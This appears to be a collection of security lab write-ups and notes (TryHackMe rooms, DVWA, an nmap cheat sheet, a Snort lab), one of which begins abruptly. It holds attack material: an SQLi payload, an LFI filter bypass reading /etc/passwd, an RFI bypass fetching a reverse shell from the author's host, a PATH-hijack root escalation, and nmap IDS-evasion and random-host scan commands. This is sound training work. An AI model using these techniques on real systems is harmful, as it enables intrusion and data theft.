Platform:TryHackMe # Description: # Someone broke into our office last night, but they destroyed the hard drives with the security footage. Can you recover the footage?
Target: # security-footage.pcap
Identification # The first step after downloading this file is to open it via Wireshark for analysis
wireshark security-footage.pcap& The next step is to identify the who and what is being sent.
Statistics >> Endpoints Here we can see that packets are sent between the MAC addresses on the red highlight rectangle. We also discover that they contain the largest chunks of data so we can safely add them to our investigation bucket-list.
Acquire # The next step is to find and export the data being transmitted which we know from our description that it is a video stream, probably unencrypted.
Pick a Frame as long as is from the identified source or destination address and right click to open a menu — in our case we picked Frame number 8. Scroll on the menu up to: Follow >> TCP Stream and click it to open stream Extraction # As we saw in the above screenshot, the entire conversation packets (5,963 kB) almost match with our earlier findings in the Identification step. Also we can see that the content type is multipart and image jpeg format which tells us that it is a continuous stream of images making up a video hence we can try to extract it.
Change the Show as from ASCII to raw: we want to extract it as raw data then click save as and save it as extracted.mjpeg which is motion jpeg. Cleaning # Now as you saw from the extraction, the raw data was not that clean, it contained contamination from the HTTP Headers. We can view it using hexeditor to verify. The magic byte for our target footage is FF D8.
Conversion and Analysis # We can try to render the raw footage as cleaned.mjpeg but it will not play as video but rather render as jpeg image. Now we need to convert it to an mp4 format so that we can play the video footage.
ffmpeg -i cleaned.mjpeg -c:v libx264 -pix_fmt yuv420p footage.mp4 ffmpeg version 8.1.1-3 Copyright (c) 2000-2026 the FFmpeg developers built with gcc 15 (Debian 15.2.0-17) configuration: --prefix=/usr --extra-version=3 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --disable-pocketsphinx --disable- ... [out#0/mp4 @ 0x5612a299d000] video:2056KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.351235% frame= 541 fps=164 q=-1.0 Lsize= 2064KiB time=00:00:21.56 bitrate= 784.1kbits/s speed=6.52x elapsed=0:00:03.30 Flag # We can then be able to see a footage of a phone displaying a train of strings which was our flag.

user:Miyamoto who is a super user. DB password:[REDACTED] Access as super user # Tried to log in using those creds and it’s a hit! we logged in successfully as Miyamoto and the db password we obtained earlier
We first head to System->Templates->Administrator Templates. “This could be a good place to start looking” Once there, we select a template we would like to edit. Pasted our reverseshell payload in the index.php template and loaded

User Flag # we were able to find the user flag, now we need to find the root flag PrivEsc # We made a new discovery that our user can execute a command with root privileges without the need for password We this we could try performing path Hi-Jack attack when running the binary
Now we got to expoit the DbMaria binary to get a root shell The -p # is to ensure that uid privileges are not dropped after executing the binary Root Flag # Finally we have grabbed our root flag, mission accomplished! Lessons learned. # Always update your software, regularly. Don’t run outdated software. Joomla was running a vulnerable version that enabled unautheticated information disclosure. PHP 8.2 obsolete version enabled upload and execution of malicious scripts. You should give unintended permissions to a binary, misconfigurations. DbMaria binary ran with root privileges which enabled path hijacking attack

Platform: TryHackMe # Creator: TryHackMe # Objective # This room breaks down 3 of the Top 10 2025 categories. In this room, you will learn about the categories that are related to failures in how Identity, Authentication, Authorisation, and Accountability (AAA) is implemented in the application. You will put the theory into practice by completing supporting challenges. The following categories are covered in this room:
A01: Broken Access Control A07: Authentication Failures A09: Logging & Alerting Failures Target: # https://bank.thm/
Notes # AAAI is a simple way to think about how users and their actions are verified on applications. Each item plays a crucial role and it isn't possible to skip a level. That means, if a previous item isn't being performed, you cannot perform the later times. The four items are: Identity - the unique account (e.g., user ID/email) that represents a person or service. Authentication - proving that identity (passwords, OTP, passkeys). Authorisation - what that identity is allowed to do. Accountability - recording and alerting on who did what, when, and from where. TASK 3 # Identified user id=7 has more tha $1 m in their account through IDOR Task 4 # We successfull create user with modified username that possibly will rise a confusion when querying the target user :admin Login using admin username and the password we had created with user aDmiN 🎊 Hurray! we managed to login successfully Task 5 # It looks like an attacker tried to perform a brute-force attack, what is the IP of the attacker? Hurray! we completed the Room
title: OWASP Top 10 2025 — IAAA Failures

Platform:DVWA # Initial Access # starting the dvwa container in docker docker run --name dvwa -d -p 80:80 santosomar/dvwa identifying the machines ip Target : # 10.0.2.15
Access via browser http://10.0.2.15:80/index.php default creds: admin:password Task 1 SQLI # SQL injection attack(SQLI) is the insertion of a SQL query via client-supplied input data to an application. This hostile data tricks the database interpreter into executing unintended commands or accessing data without proper authorization. Key SQL Injection Types (OWASP)
**In-band (Classic) SQLi: The attacker uses the same communication channel to launch the attack and gather results. ** Error-based SQLi: The attacker forces the database to produce error messages, providing information about the database structure. UNION-based SQLi: Uses the UNION SQL operator to combine forged queries with legitimate ones to retrieve data from other tables. **Inferential (Blind) SQLi: The attacker sends data payloads and observes the server’s response and behavior to reconstruct data. ** Boolean-based Blind SQLi: The application returns different responses depending on whether the query returns a TRUE or FALSE result. Time-based Blind SQLi: The application pauses or delays before responding based on whether the query result is true or false. Out-of-band SQLi: Occurs when an attacker cannot use the same channel to launch the attack and gather results, often using database features to send data to an external server Level:Medium # SQL Injection Lab # The Idea is to return all other users at once. Watching the source we can see how the database query looks like “SELECT ….;”
I open burp to see how the request looks like by intercepting the request Now send the request to repeater to try our payload
OR 1=1 THE ABOVE PAYLOAD QUERIES THE DB USING: SELECT first_name, last_name FROM users WHERE user_id = 5 OR 1=1; This results in the db returning user id 5 and other rows by manipulating the WHERE clause of a db query to make it always true, forcing the db to return all rows instead of just one. This sqli injection is usually known as Boolean-Based Sqli. Task 2: FI # file inclusion vulnerabilities occur when applications improperly sanitize user-supplied input used in file-system APIs, allowing attackers to load, execute, or disclose malicious local (LFI) or remote (RFI) files
Key File Inclusion Types (OWASP)
Local File Inclusion (LFI): Attacker forces the application to include files already present on the server, often using directory traversal characters (e.g., ../../) to access restricted files. Remote File Inclusion (RFI): Attacker forces the application to include a file hosted on a remote server, often resulting in remote code execution. Level:Medium # File Inclusion Lab # Ok, when we look at the source code we can see that some filters are applied to prevent the path traversal via “../ & ..” to try prevent LFI and “http:// & https://” to try prevent RFI But there is a catch, you see, these validation filters are not efficient as they fail to validate recursively LFI 💡 some thing like ….//….//….//….//….//etc/passwd should work and boom it worked perfectly Input validator strips our payload to strip to ../../../../../etc/passwd by replacing ../ with an empty string which is the real payload
RFI 💡 now let us try including remote files. I will host a reverse shell script on my local machine
┌──(kali㉿Kali)-[~/Downloads] └─$ python3 -m http.server 81 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ... also i will start a netcat listen on another terminal to listen to any incoming connections from port 4444
┌──(kali㉿Kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ... Now will perform rfi on the target Note: the target filters the url http:// so we will bypass using httphttp://://10.6.6.1:81/shell.php the highlighted part will be replace with empty string
🎉And vualah! we get a reverse shell to the machine
title: DVWA — SQLi & File Inclusion

content: Quick start # nmap -sn 192.168.1.0/24 # ping sweep — discover live hosts nmap -F target # fast scan — top 100 ports nmap -sV -sC target # service version + default scripts nmap -A target # aggressive: OS + version + scripts + traceroute Target specification # nmap target # single IP or hostname nmap 192.168.1.1 192.168.1.2 # multiple targets nmap 192.168.1.1-254 # range nmap 192.168.1.0/24 # CIDR nmap -iL targets.txt # targets from file nmap -iR 100 # 100 random hosts nmap --exclude 192.168.1.1 # exclude a host Scan techniques # nmap -sS target # TCP SYN stealth (default root) nmap -sT target # TCP connect (default non-root) nmap -sU target # UDP scan nmap -sA target # TCP ACK — firewall detection nmap -sW target # TCP Window nmap -sM target # TCP Maimon Host discovery # nmap -sn target # disable port scan, host discovery only nmap -Pn target # skip host discovery, assume up nmap -PS22-25,80 target # TCP SYN discovery on specific ports nmap -PA22-25,80 target # TCP ACK discovery nmap -PU53 target # UDP discovery nmap -PR target # ARP discovery (local network) nmap -n target # no DNS resolution nmap -sL target # list targets only (no scan) Port specification # nmap -p 21 target # single port nmap -p 21-100 target # range nmap -p U:53,T:21-25,80 target # mixed TCP/UDP nmap -p- target # all 65535 ports nmap -p http,https target # by service name nmap -F target # fast — top 100 ports nmap --top-ports 2000 target # top N ports Service & version detection # nmap -sV target # version detection nmap -sV --version-intensity 9 target # max intensity (slow) nmap -sV --version-light target # faster, less accurate nmap -sV --version-all target # intensity 9 OS detection # nmap -O target # remote OS guess via TCP/IP fingerprint nmap -O --osscan-limit target # skip if no open+closed port found nmap -O --osscan-guess target # guess more aggressively nmap -O --max-os-tries 1 target # limit attempts Timing & performance # nmap -T0 target # Paranoid — IDS evasion nmap -T1 target # Sneaky nmap -T2 target # Polite — low bandwidth nmap -T3 target # Normal (default) nmap -T4 target # Aggressive — fast network nmap -T5 target # Insane — very fast nmap --host-timeout 30s target # give up on host after 30s nmap --max-retries 3 target # limit probe retransmits nmap --min-rate 100 target # send ≥100 pkts/s nmap --max-rate 100 target # send ≤100 pkts/s NSE scripts # nmap -sC target # default safe scripts nmap --script default target # same as -sC nmap --script banner target # single script nmap --script http* target # wildcard nmap --script http,banner target # multiple scripts nmap --script "not intrusive" target # exclude intrusive nmap --script=http-sitemap-generator target # http site map nmap --script=dns-brute domain.com # subdomain brute force nmap --script=http-sql-injection target # SQLi check nmap -p80 --script=http-unsafe-output-escaping target # XSS check nmap --script whois* domain.com # whois lookup nmap -p445 --script smb-vuln* target # SMB vuln scan Firewall / IDS evasion # nmap -f target # fragment packets nmap -mtu 32 target # custom MTU nmap -D decoy1,decoy2,ME,decoy3 target # decoy IPs nmap -S spoofed-ip target # spoof source nmap -g 53 target # use source port 53 (DNS) nmap --proxies http://proxy:8080 target # proxy tunnel nmap --data-length 200 target # append random data # evasion combo nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102 target Output # nmap -oN output.txt target # normal nmap -oX output.xml target # XML nmap -oG output.gnmap target # grepable nmap -oA output target # all three formats nmap -v target # verbose (use -vv for more) nmap -d target # debug (use -dd for more) nmap --reason target # why port is in that state nmap --open target # show open ports only nmap --packet-trace target # show all packets nmap -iflist # list host interfaces/routes Useful one-liners # # Random web servers nmap -n -Pn -p 80 --open -sV -vv --script banner,http-title -iR 1000 # Live hosts from scan nmap -iR 10 -n -oX out.xml | grep "Nmap" | cut -d " " -f5 > live-hosts.txt # Compare scans ndiff scan1.xml scan2.xml # XML to HTML xsltproc nmap.xml -o nmap.html # Port frequency analysis grep " open " results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less Port states # State Meaning open Service actively accepting connections closed Port accessible, no service listening filtered Firewall/IPS blocking probes unfiltered Accessible but state unknown; needs different scan open|filtered Can’t distinguish; try -sV or NSE closed|filtered Rare; usually from IP ID idle scans

Objective # Stand up Snort as an IDS sensor on a mirror/span port in EVE-NG, baseline traffic, and verify alerts against controlled scan traffic.

Configuration (summary) # Provision Linux VM for Snort; attach to SPAN destination. Install Snort with community ruleset; set HOME_NET and EXTERNAL_NET. Replay small nikto probe against a test web VM; expect HTTP-oriented alerts. Lessons learned # Tune false positives before demos; document suppressed SIDs. Keep PCAPs for academic panels — correlate alert timeline with Wireshark. sudo snort -A fast -c /etc/snort/snort.conf -i eth1
